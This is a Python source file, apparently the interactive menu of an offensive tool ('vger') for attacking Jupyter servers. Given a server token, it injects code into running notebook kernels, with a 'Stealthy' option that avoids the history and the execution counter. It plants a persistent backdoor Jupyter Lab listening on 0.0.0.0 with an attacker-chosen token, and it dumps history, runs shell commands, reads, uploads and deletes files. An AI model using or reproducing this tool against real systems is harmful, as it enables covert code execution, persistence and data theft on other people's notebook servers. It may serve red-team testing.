from vger.connection import Connection
import inquirer
from vger.attack import attack_session, run_ephemeral_terminal
import asyncio
import json
import base64


class Menu:
    def __init__(self):
        self.server = None
        self.secret = None
        self.sessions = list()
        self.target = None
        self.connection = None

    def login(self):
        while len(self.sessions) == 0:
            login_questions = [
                inquirer.Text(
                    "server",
                    message="What is the server hostname?",
                    default="http://localhost:8888/",
                ),
                inquirer.Text(
                    "secret", message="What is the secret token or password?"
                ),
            ]
            answers = inquirer.prompt(login_questions)
            self.server = answers["server"]
            if self.server[-1] != "/":
                self.server += "/"
            self.secret = answers["secret"]
            try:
                self.connection = Connection(self.server, self.secret)
                self.sessions = self.connection.list_running_jpy_sessions()
            except:
                print("There was a problem connecting to that server. Try again.")

    def pick_target(self):
        session_info = dict()
        for s in self.sessions:
            name = self.connection.jpy_sessions[s]["name"]
            last_active = f"Last Active: {self.connection.jpy_sessions[s]['kernel']['last_activity']}"
            session_info[f"{name:<20} {last_active:<30}"] = s
        select_kernel = [
            inquirer.List(
                "kernel",
                message="Which notebook would you like to attach to?",
                choices=session_info.keys(),
            )
        ]
        answer = inquirer.prompt(select_kernel)
        self.target = session_info[answer["kernel"]]

    def execute_op(self):
        answer = dict()
        answer["option"] = None
        while answer["option"] != "Reset":
            nav_menu = [
                inquirer.List(
                    "option",
                    message="What would you like to do?",
                    choices=[
                        "Reset",
                        "Switch Notebooks",
                        "Inject",
                        "Backdoor",
                        "Check History",
                        "Run shell command",
                        "List dir or get file",
                        "Upload file",
                        "Delete file",
                    ],
                )
            ]
            answer = inquirer.prompt(nav_menu)
            match answer["option"]:
                case "Inject":
                    self.inject()
                case "Backdoor":
                    self.jupyter_backdoor()
                case "Check History":
                    self.dump_history()
                case "Switch Notebooks":
                    self.switch_target_notebook()
                case "Run shell command":
                    self.run_in_shell()
                case "List dir or get file":
                    self.list_dir()
                case "Upload file":
                    self.upload()
                case "Delete file":
                    self.delete()
        self.__init__()
        self.main()

    def inject(self):
        attack_menu = [
            inquirer.List(
                "payload",
                message="Would you like to type your payload or reference an existing .py file?",
                choices=["Type", ".py"],
            )
        ]
        answer = inquirer.prompt(attack_menu)
        if answer["payload"] == "Type":
            payload_str = inquirer.editor("What code would you like to inject?")
        else:
            payload = [
                inquirer.Path(
                    "path", "Where is the payload .py? ", path_type=inquirer.Path.FILE
                )
            ]
            answer = inquirer.prompt(payload)
            path = answer["path"].split("? ")[-1]
            with open(path, "r") as f:
                payload_str = f.read()
        silent = [
            inquirer.List(
                "choice",
                message="Would you like show up in the history and modify the execution counter?",
                choices=["Yes (Noisy)", "No (Stealthy)"],
            )
        ]
        answer = inquirer.prompt(silent)
        if "Yes" in answer["choice"]:
            silent = False
        else:
            silent = True
        loop = asyncio.get_event_loop()
        loop.run_until_complete(
            attack_session(self.connection, self.target, payload_str, silent=silent)
        )

    def jupyter_backdoor(self):
        config = [
            inquirer.Text(
                "port", message="What port do you want your Jupyter Server to run on?"
            ),
            inquirer.Text(
                "secret", message="What password do you want to use for authentication?"
            ),
        ]
        config = inquirer.prompt(config)
        loop = asyncio.get_event_loop()
        port = config["port"]
        secret = config["secret"]
        launch_jupyter = f"nohup jupyter lab --ip=0.0.0.0 --port={port} --allow-root --no-browser --NotebookApp.token={secret} >/dev/null 2>/dev/null &"
        loop.run_until_complete(
            run_ephemeral_terminal(self.connection, launch_jupyter, stdout=False)
        )
        print(f"Backdoor established on {port}")

    def dump_history(self):
        loop = asyncio.get_event_loop()
        loop.run_until_complete(
            attack_session(
                self.connection,
                self.target,
                f"%history",
                silent=False,
                print_out=False,
                get_hist=True,
            )
        )

    def switch_target_notebook(self):
        self.pick_target()
        self.execute_op()

    def run_in_shell(self):
        code = [inquirer.Text("code", "What code would you like to inject?")]
        answers = inquirer.prompt(code)
        loop = asyncio.get_event_loop()
        loop.run_until_complete(
            run_ephemeral_terminal(self.connection, answers["code"])
        )

    def list_dir(self):
        dir = [
            inquirer.Text(
                "dir",
                "What directory would you like to list (relative to the Jupyter directory)? You can also use this to read plaintext files.",
                default="/",
            )
        ]
        answers = inquirer.prompt(dir)
        results = self.connection.list_dir(answers["dir"])
        self.connection.con.print_json(json.dumps(results))

    def upload(self):
        payload = [
            inquirer.Path(
                "path",
                "What file do you want to upload? ",
                path_type=inquirer.Path.FILE,
            )
        ]
        answer = inquirer.prompt(payload)
        file_path = answer["path"].split("? ")[-1]
        with open(file_path, "rb") as f:
            payload = f.read()
            payload = base64.b64encode(payload).decode("utf-8")
        target = [
            inquirer.Text("path", "Where do you want to place the file?", default="/")
        ]
        answer = inquirer.prompt(target)
        data = {
            "content": payload,
            "format": "base64",
            "path": answer["path"],
            "type": "file",
        }
        self.connection.con.print(
            self.connection.upload(answer["path"], json.dumps(data))
        )

    def delete(self):
        target = [inquirer.Text("path", "What file do you want to delete?")]
        answer = inquirer.prompt(target)
        response = self.connection.delete(answer["path"])
        if response.status_code == 204:
            self.connection.con.print(f"{answer["path"]} deleted successfully")
        else:
            self.connection.con.print(f"Error deleting {answer["path"]}")

    def main(self):
        self.login()
        answer = [
            inquirer.List(
                "option",
                message="Connect to user session or run shell command?",
                choices=[
                    "User session",
                    "Run shell command",
                    "List dir or plaintext file",
                    "Upload file",
                    "Delete file",
                ],
            )
        ]
        answer = inquirer.prompt(answer)
        match answer["option"]:
            case "User session":
                self.pick_target()
                self.execute_op()
            case "Run shell command":
                self.run_in_shell()
                self.main()
            case "List dir or get file":
                self.list_dir()
                self.main()
            case "Upload file":
                self.upload()
                self.main()
            case "Delete file":
                self.delete()
                self.main()


def cli():
    m = Menu()
    m.main()


if __name__ == "__main__":
    m = Menu()
    m.main()
